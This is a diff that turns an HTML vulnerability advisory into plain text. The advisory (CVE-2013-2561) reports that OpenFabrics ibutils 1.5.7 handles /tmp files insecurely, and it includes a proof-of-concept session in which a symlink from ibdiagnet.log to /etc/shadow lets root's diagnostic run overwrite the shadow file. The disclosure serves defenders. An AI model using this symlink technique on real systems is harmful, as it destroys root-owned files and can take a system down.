@@ -1,78 +1,58 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 58&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; OpenFabrics ibutils 1.5.7 /tmp clobbering vulnerability&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2013-03-16&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www.openfabrics.org/downloads/ibutils/">http://www.openfabrics.org/downloads/ibutils/</a>"&gt;<a href="http://www.openfabrics.org/downloads/ibutils/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.openfabrics.org/downloads/ibutils/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;open fabrics&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2013-03-25&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://bugzilla.redhat.com/show_bug.cgi?id=927430&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://bugzilla.redhat.com/show_bug.cgi?id=927430&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;The infiniband diagnostic utility.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The infiniband diagnostic utiltiy handles files in /tmp insecurely. A malicious user can clobber root owned files with common symlink attacks.
-</p><p><a href="http://www.openfabrics.org/downloads/ibutils/">http://www.openfabrics.org/downloads/ibutils/</a>
-</p><p>[nobody@exdb01 tmp]$ ln -s /etc/shadow ibdiagnet.log 
-[nobody@exdb01 tmp]$ ls -l ibdiagnet.log 
-lrwxrwxrwx 1 nobody users 11 Mar 6 18:19 ibdiagnet.log -&amp;gt; /etc/shadow 
-[nobody@exdb01 tmp]$
-</p><p>The following files are created, I imagine anyone of them can be used.
-</p><p>[root@exdb01 tmp]<strong> ls -l /tmp/ibdiagnet*
--rw-r--r-- 1 root root  57611 Mar  6 18:20 /tmp/ibdiagnet.db
--rw-r--r-- 1 root root    830 Mar  6 18:20 /tmp/ibdiagnet.fdbs
--rw-r--r-- 1 root root   5805 Mar  6 18:20 /tmp/ibdiagnet_ibis.log
--rw-r--r-- 1 root root   2359 Mar  6 18:20 /tmp/ibdiagnet.log
--rw-r--r-- 1 root root   7072 Mar  6 18:20 /tmp/ibdiagnet.lst
--rw-r--r-- 1 root root    456 Mar  6 18:20 /tmp/ibdiagnet.mcfdbs
--rw-r--r-- 1 root root    784 Mar  6 18:20 /tmp/ibdiagnet.pkey
--rw-r--r-- 1 root root   3348 Mar  6 18:20 /tmp/ibdiagnet.psl
--rw-r--r-- 1 root root 179228 Mar  6 18:20 /tmp/ibdiagnet.slvl
--rw-r--r-- 1 root root    193 Mar  6 18:20 /tmp/ibdiagnet.sm
-After root runs a diagnostic command:<br/>
-[root@exdb01 tmp]</strong> ibdiagnet -ls 10 -lw 4x -vlr 
-Loading IBDIAGNET from: /usr/lib64/ibdiagnet1.5.7 -W- Topology file is not specified.
-</p><p>Reports regarding cluster links will use direct routes. 
-Loading IBDM from: /usr/lib64/ibdm1.5.7 -W- A few ports of local device are up.
-</p><p>Since port-num was not specified (-p option), port 1 of device 1 will be used as the local port.
--I- Discovering ... 7 nodes (2 Switches &amp;amp; 5 CA-s) discovered. .
-.<br/>
-.<br/>
-.
-</p><p>Extracting SL Based Routing Info 0 0
-</p><p>Please see /tmp/ibdiagnet.log for complete log
--I- Done. Run time was 2 seconds.
-</p><p>Symlinked files are overwritten:<br/>
-[root@exdb01 tmp] ls -l /etc/shadow<br/>
--rw------- 1 root root 2359 Mar 6 18:17 /etc/shadow 
-[root@exdb01 tmp] head /etc/shadow<br/>
--W- Topology file is not specified.
-</p><p>Reports regarding cluster links will use direct routes. -W- A few ports of local device are up.
-</p><p>Since port-num was not specified (-p option), port 1 of device 1 will be used as the local port.
--I- Discovering ... 7 nodes (2 Switches &amp;amp; 5 CA-s) discovered.
-</p><p>-I--------------------------------------------------- -I- Bad Guids/LIDs Info
-</p><p>Versions installed
-</p><p>[root@exdb01 tmp] rpm -aq |grep ibutils ibutils-1.5.7-1.el5
-ibutils-libs-1.5.7-1.el5<br/>
-ibutils-devel-1.5.7-1.el5<br/>
-[root@exdb01 tmp]
-</p><p>ibis binary also creates files insecurely in /tmp: /tmp/ibis.log from the man page:
-<strong>IBIS(1)             IB MANAGEMENT IN-BAND SERVICES PACKAGE             IBIS(1)</strong>
-</p><p><strong>NAME</strong>
-</p><p>       ibis - IB management Inband Services - an extended TCL shell
-</p><p><strong>SYNOPSYS</strong>
-</p><p>       ibis [-port_num ]
-</p><p><strong>DESCRIPTION</strong>
-</p><pre>
-       ibis is a TCL shell extended with interface for sending and receiving IB management datagrams (MADS).  To use this shell you
-       will write TCL code that excersizes the regular TCL command and the special API provided by this extension. Interactive use is
-       also possible and is greatly enhanced if tclreadline package is available on the machine.
-       The following sub sections provide detailed definition for the API and global objects defined by the extension. The different
-       MADs APIs are group by the management class.</pre>
-<p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=927430&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://bugzilla.redhat.com/show_bug.cgi?id=927430&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;CVE-2013-2561&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=58"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/ibutils-file-clobber.html">http://www.vapid.dhs.org/advisories/ibutils-file-clobber.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/ibutils-file-clobber.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/ibutils-file-clobber.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 58
+Title: OpenFabrics ibutils 1.5.7 /tmp clobbering vulnerability
+Author:Larry W. Cashdollar, @_larry0
+Date: 2013-03-16
+Download Site: http://www.openfabrics.org/downloads/ibutils/
+Vendor:open fabrics
+Vendor Notified: 2013-03-25
+Vendor Contact: https://bugzilla.redhat.com/show_bug.cgi?id=927430
+Description: The infiniband diagnostic utility.
+Vulnerability:
+The infiniband diagnostic utiltiy handles files in /tmp insecurely. A malicious
+user can clobber root owned files with common symlink attacks. http://
+www.openfabrics.org/downloads/ibutils/ [nobody@exdb01 tmp]$ ln -s /etc/shadow
+ibdiagnet.log [nobody@exdb01 tmp]$ ls -l ibdiagnet.log lrwxrwxrwx 1 nobody
+users 11 Mar 6 18:19 ibdiagnet.log -> /etc/shadow [nobody@exdb01 tmp]$ The
+following files are created, I imagine anyone of them can be used. [root@exdb01
+tmp]# ls -l /tmp/ibdiagnet* -rw-r--r-- 1 root root 57611 Mar 6 18:20 /tmp/
+ibdiagnet.db -rw-r--r-- 1 root root 830 Mar 6 18:20 /tmp/ibdiagnet.fdbs -rw-r--
+r-- 1 root root 5805 Mar 6 18:20 /tmp/ibdiagnet_ibis.log -rw-r--r-- 1 root root
+2359 Mar 6 18:20 /tmp/ibdiagnet.log -rw-r--r-- 1 root root 7072 Mar 6 18:20 /
+tmp/ibdiagnet.lst -rw-r--r-- 1 root root 456 Mar 6 18:20 /tmp/ibdiagnet.mcfdbs
+-rw-r--r-- 1 root root 784 Mar 6 18:20 /tmp/ibdiagnet.pkey -rw-r--r-- 1 root
+root 3348 Mar 6 18:20 /tmp/ibdiagnet.psl -rw-r--r-- 1 root root 179228 Mar 6
+18:20 /tmp/ibdiagnet.slvl -rw-r--r-- 1 root root 193 Mar 6 18:20 /tmp/
+ibdiagnet.sm After root runs a diagnostic command: [root@exdb01 tmp]# ibdiagnet
+-ls 10 -lw 4x -vlr Loading IBDIAGNET from: /usr/lib64/ibdiagnet1.5.7 -W-
+Topology file is not specified. Reports regarding cluster links will use direct
+routes. Loading IBDM from: /usr/lib64/ibdm1.5.7 -W- A few ports of local device
+are up. Since port-num was not specified (-p option), port 1 of device 1 will
+be used as the local port. -I- Discovering ... 7 nodes (2 Switches & 5 CA-s)
+discovered. . . . . Extracting SL Based Routing Info 0 0 Please see /tmp/
+ibdiagnet.log for complete log -I- Done. Run time was 2 seconds. Symlinked
+files are overwritten: [root@exdb01 tmp] ls -l /etc/shadow -rw------- 1 root
+root 2359 Mar 6 18:17 /etc/shadow [root@exdb01 tmp] head /etc/shadow -W-
+Topology file is not specified. Reports regarding cluster links will use direct
+routes. -W- A few ports of local device are up. Since port-num was not
+specified (-p option), port 1 of device 1 will be used as the local port. -I-
+Discovering ... 7 nodes (2 Switches & 5 CA-s) discovered. -I-------------------
+-------------------------------- -I- Bad Guids/LIDs Info Versions installed
+[root@exdb01 tmp] rpm -aq |grep ibutils ibutils-1.5.7-1.el5 ibutils-libs-1.5.7-
+1.el5 ibutils-devel-1.5.7-1.el5 [root@exdb01 tmp] ibis binary also creates
+files insecurely in /tmp: /tmp/ibis.log from the man page: IBIS(1) IB
+MANAGEMENT IN-BAND SERVICES PACKAGE IBIS(1) NAME ibis - IB management Inband
+Services - an extended TCL shell SYNOPSYS ibis [-port_num ] DESCRIPTION ibis is
+a TCL shell extended with interface for sending and receiving IB management
+datagrams (MADS). To use this shell you will write TCL code that excersizes the
+regular TCL command and the special API provided by this extension. Interactive
+use is also possible and is greatly enhanced if tclreadline package is
+available on the machine. The following sub sections provide detailed
+definition for the API and global objects defined by the extension. The
+different MADs APIs are group by the management class. https://
+bugzilla.redhat.com/show_bug.cgi?id=927430
+CVE-2013-2561
+JSON:Export
+Exploit Code:
+   1.  
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/ibutils-file-clobber.html
